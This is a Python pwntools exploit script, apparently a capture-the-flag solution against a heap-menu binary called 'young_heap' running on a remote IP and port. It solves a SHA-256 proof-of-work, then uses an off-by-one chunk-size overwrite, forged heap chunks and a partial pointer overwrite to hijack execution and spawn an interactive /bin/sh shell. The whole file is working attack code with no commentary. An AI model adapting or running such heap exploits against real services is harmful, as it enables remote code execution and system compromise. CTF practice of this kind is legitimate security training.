#!/usr/bin/env python2.7
# -*- coding: utf-8 -*-

__author__ = "luckasdf0"

from pwn import *
import time
from itertools import product
from hashlib import sha256

# Settings
context.terminal = ['tmux', 'splitw', '-h']

io = remote("47.89.11.82",10009)
#io = remote("139.199.185.67",12001)
#io = process("./young_heap", env = {"LD_PRELOAD" : "./libc.so.6"})
#io = process("./young_heap")

# gdb
def attach(addr):
    gdb.attach(io, gdbscript='b *0x%x' % (addr))

def malloc(size, content):
    io.recvuntil('4. Exit')
    io.sendline('1')
    io.recvuntil('Size :')
    io.sendline(str(size))
    io.recvuntil('Content :')
    io.sendline(content)

def edit(idx, content):
    io.recvuntil('4. Exit')
    io.sendline('2')
    io.recvuntil('Index of heap :')
    io.sendline(str(idx))
    io.recvuntil('Content :')
    io.send(content)

def free(idx):
    io.recvuntil('4. Exit')
    io.sendline('3')
    io.recvuntil('Index of heap :')
    io.sendline(str(idx))

chs = string.ascii_letters+string.digits

def proof():
    global io, chs
    io.recvuntil('xxxx+')
    s = io.recv(16)
    io.recvuntil('== ')
    d = io.recv(64)
    print s, d
    for i in product(chs, repeat=4):
        if sha256(''.join(i)+s).hexdigest() == d:
            print bytearray(i)
            res = ''.join(i)
            break
    io.sendlineafter('xxxx:', res)

proof()

malloc(0x10, '0'*0x10)
malloc(0x10, '1'*0x10)
malloc(0x68, '2'*0x68)
malloc(0x20, '3'*0x20)
malloc(0x40, '4'*0x40)
malloc(0x20, '5'*0x20)

free(0)
free(2)
edit(3, '3'*0x20+'\xe9')
free(4)

chunk  = ''
chunk += 'a'*0x10
chunk += p64(0x21)
chunk += p64(0x20)
chunk += 'a'*0x10
chunk += p64(0x78)
chunk += p64(0x78)
chunk += p64(0x6020e5)
chunk  = chunk.ljust(0x58, 'a')

malloc(0x60, chunk)
malloc(0x68, '0'*0x68)

payload = '2'*3
payload += p64(0x602060)
payload = payload.ljust(0x68, '2')
malloc(0x68, payload)

#attach(0x400A5D)
time.sleep(6)
edit(7, p16(0xf390))
io.recvuntil('4. Exit')
io.sendline('/bin/sh\x00')

#free(1)

io.interactive()
